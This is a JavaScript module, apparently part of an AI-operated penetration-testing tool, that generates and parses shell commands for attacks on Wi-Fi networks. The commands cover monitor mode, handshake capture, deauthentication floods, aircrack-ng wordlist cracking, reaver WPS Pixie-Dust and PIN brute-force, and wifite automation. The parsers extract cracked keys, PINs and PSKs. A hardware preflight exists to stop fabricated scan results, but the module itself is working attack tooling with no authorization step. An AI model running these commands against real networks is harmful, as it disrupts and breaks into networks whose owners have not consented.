// Wireless attack command builders + output parsers.
//
// IMPORTANT REALITY: Wi-Fi monitor mode needs PHYSICAL, monitor-capable radio hardware attached to the
// machine that runs the exec backend (and within RF range of the target). There is NO software bypass — a
// container/VM/cloud host with no radio cannot scan or deauth anything. So every command here begins with a
// real adapter PREFLIGHT: it auto-detects a wireless interface and, if none exists, prints a clear
// WIRELESS-NOADAPTER message and exits. This is what stops the model from fabricating fake AP lists when the
// real command would have failed — the tool now always tells the truth about the hardware.

// Shell prelude: find a wireless interface into $IFACE, or print the honest "no adapter" message and exit.
const DETECT = [
  // Authoritative wireless list first (iw dev). Fallback: only interfaces that actually expose a wireless
  // subdir in sysfs — this correctly EXCLUDES eth0/lo, so we never mistake a wired NIC for a radio.
  'IFACE=$(iw dev 2>/dev/null | awk "/Interface/{print \\$2; exit}");',
  'if [ -z "$IFACE" ]; then for i in /sys/class/net/*; do [ -d "$i/wireless" ] || [ -d "$i/phy80211" ] && { IFACE=$(basename "$i"); break; }; done; fi;',
  'if [ -z "$IFACE" ]; then echo "WIRELESS-NOADAPTER: No wireless interface is present in this exec environment (only wired/loopback). Real Wi-Fi scanning, deauth, handshake capture and WPS attacks are IMPOSSIBLE without a monitor-mode-capable radio physically attached to the machine running the exec backend, in range of the target. This is a hardware limit — no software can create a radio, and any AP list without a real adapter would be fabricated. Attach a monitor-capable USB adapter (e.g. Alfa AWUS036ACH / an ath9k_htc or rtl8812au device), pass it through to the exec host, then retry."; exit 3; fi;',
].join(' ');

// Turn the detected $IFACE into a monitor interface into $MON (airmon-ng), best-effort.
const TO_MONITOR = [
  'airmon-ng check kill >/dev/null 2>&1;',
  'airmon-ng start "$IFACE" >/dev/null 2>&1;',
  'MON=$(iw dev 2>/dev/null | awk "/Interface/{print \\$2}" | grep -iE "mon" | head -1);',
  'MON=${MON:-$IFACE};',
  'echo "[*] using wireless interface: $MON";',
].join(' ');

// Build a command for a high-level wireless action.
//   action: scan | monitor | capture | deauth | crack | wps | auto
export function buildWirelessCommand({ action, iface, mon, bssid, channel, wordlist = '/usr/share/wordlists/rockyou.txt', cap = 'capture-01.cap' } = {}) {
  switch (action) {
    case 'monitor':
      return `${DETECT} ${TO_MONITOR} iw dev`;
    case 'scan':
      // detect -> monitor -> live scan of nearby real APs (30s)
      return `${DETECT} ${TO_MONITOR} echo "[*] scanning nearby Wi-Fi for 30s..."; timeout 30 airodump-ng "$MON"`;
    case 'capture':
      if (!bssid || !channel) return 'echo "WIRELESS-USAGE: capture needs a BSSID and channel — run a scan first (```wireless scan)."';
      return `${DETECT} ${TO_MONITOR} echo "[*] capturing handshake for ${bssid} on ch ${channel}..."; timeout 60 airodump-ng --bssid ${bssid} -c ${channel} -w capture "$MON"`;
    case 'deauth':
      if (!bssid) return 'echo "WIRELESS-USAGE: deauth needs a target BSSID — run a scan first (```wireless scan)."';
      // real deauth against a detected monitor interface
      return `${DETECT} ${TO_MONITOR} echo "[*] sending deauth to ${bssid}..."; aireplay-ng --deauth 10 -a ${bssid} "$MON"`;
    case 'crack':
      // cracking runs offline on a .cap — no adapter needed; only needs the capture + wordlist
      return `[ -f "${cap}" ] || { echo "WIRELESS-USAGE: no capture file ${cap} — capture a handshake first."; exit 3; }; aircrack-ng -w ${wordlist} ${bssid ? '-b ' + bssid + ' ' : ''}${cap}`;
    case 'wpsscan':
      // Recon step: find WPS-enabled APs nearby (wash) before running reaver.
      return `${DETECT} ${TO_MONITOR} echo "[*] scanning for WPS-enabled APs (wash) for 30s..."; timeout 30 wash -i "$MON"`;
    case 'pixie':
      // Pixie-Dust: offline WPS attack — cracks vulnerable APs in seconds (try this FIRST, before brute-force).
      if (!bssid) return 'echo "WIRELESS-USAGE: pixie needs a target BSSID — run ```wireless wpsscan first."';
      return `${DETECT} ${TO_MONITOR} echo "[*] Pixie-Dust WPS attack on ${bssid}..."; reaver -i "$MON" -b ${bssid} ${channel ? '-c ' + channel + ' ' : ''}-K 1 -vv`;
    case 'wps':
      // Standard WPS PIN brute-force (slow — hours; pixie is faster where it works).
      if (!bssid) return 'echo "WIRELESS-USAGE: wps needs a target BSSID — run ```wireless wpsscan first (and try ```wireless pixie, it is much faster)."';
      return `${DETECT} ${TO_MONITOR} echo "[*] WPS PIN brute-force on ${bssid} (this can take hours)..."; reaver -i "$MON" -b ${bssid} ${channel ? '-c ' + channel + ' ' : ''}-vv`;
    case 'auto':
      return `${DETECT} wifite --kill`;
    default:
      // raw fallback: still preflight so we never imply a radio exists when it doesn't
      return `${DETECT} iw dev`;
  }
}

// Parse airodump-ng network list -> findings.
export function parseAirodump(text, source = 'airodump-ng') {
  const findings = [];
  for (const raw of String(text).split('\n')) {
    // BSSID  PWR Beacons #Data ... CH MB ENC CIPHER AUTH ESSID
    const m = /^([0-9A-F]{2}(?::[0-9A-F]{2}){5})\s+.*\s(WEP|WPA|WPA2|WPA3|OPN)\s.*\s+(\S.*)$/i.exec(raw.trim());
    if (m) {
      const enc = m[2].toUpperCase();
      findings.push({
        finding_type: 'wireless',
        severity: enc === 'WEP' || enc === 'OPN' ? 'high' : 'info',
        title: `Wi-Fi: ${m[3].trim()} [${enc}]`,
        host: m[1],
        evidence: raw.trim().slice(0, 200),
        source,
      });
    }
  }
  return findings;
}

// Detect handshake capture / WPS pin / cracked key.
export function parseWirelessResult(text, source = 'aircrack-ng') {
  const out = [];
  const t = String(text);
  if (/WPA handshake:\s*([0-9A-F:]{17})/i.test(t)) {
    const b = /WPA handshake:\s*([0-9A-F:]{17})/i.exec(t)[1];
    out.push({ finding_type: 'wireless', severity: 'medium', title: `WPA handshake captured (${b})`, host: b, source: 'airodump-ng' });
  }
  const key = /KEY FOUND!\s*\[\s*(.+?)\s*\]/i.exec(t);
  if (key) out.push({ finding_type: 'wireless', severity: 'critical', title: `Wi-Fi key cracked: ${key[1]}`, evidence: key[1], source });
  const pin = /WPS PIN:\s*'?(\d{8})'?/i.exec(t);
  if (pin) out.push({ finding_type: 'wireless', severity: 'critical', title: `WPS PIN found: ${pin[1]}`, evidence: pin[1], source: 'reaver' });
  const psk = /\[\+\]\s*(?:WPA PSK|PSK):\s*'(.+?)'/i.exec(t);
  if (psk) out.push({ finding_type: 'wireless', severity: 'critical', title: `WPA PSK recovered: ${psk[1]}`, evidence: psk[1], source: 'reaver' });
  // WPS enabled + (un)locked state from reaver/wash — useful even without a full crack.
  if (/Detected AP rate limiting|WPS transaction failed.*rate|AP rate limiting/i.test(t))
    out.push({ finding_type: 'wireless', severity: 'info', title: 'Target AP is WPS rate-limiting/locked (reaver will be slow — retry with -d/-l or try pixie)', evidence: 'AP rate limiting detected', source: 'reaver' });
  else if (/WPS pin not found|Pixie-Dust.*fail|not vulnerable/i.test(t))
    out.push({ finding_type: 'wireless', severity: 'info', title: 'WPS attack did not recover a PIN (AP may be patched/locked)', evidence: 'no PIN recovered', source: 'reaver' });
  return out;
}

// True if the output shows there is no real radio (so callers can surface the honest message, not findings).
export function isNoAdapter(output) {
  return /WIRELESS-NOADAPTER|Failed initializing wireless card|No such device|ioctl\(SIOCGIFINDEX\)/i.test(String(output || ''));
}

export function extractWirelessFindings(command, output) {
  if (!/airodump|aircrack|reaver|wifite|aireplay|wash/i.test(command) || !output) return [];
  if (isNoAdapter(output)) return []; // never manufacture findings when there's no radio
  const list = parseAirodump(output);
  const res = parseWirelessResult(output);
  return [...list, ...res];
}
